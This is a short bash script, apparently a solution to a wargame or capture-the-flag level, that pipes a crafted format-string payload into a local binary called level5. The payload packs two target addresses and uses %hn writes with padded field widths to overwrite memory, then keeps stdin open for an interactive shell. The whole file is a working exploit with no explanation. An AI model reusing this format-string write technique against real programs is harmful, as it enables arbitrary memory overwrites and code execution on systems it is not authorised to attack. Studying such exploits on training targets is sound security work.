#!/bin/bash
cat <(python -c "print('\x3a\x98\x04\x08' + '\x38\x98\x04\x08' + '%2044d' + '%4\$hn' + '%31904d' + '%5\$hn')") - | ./level5
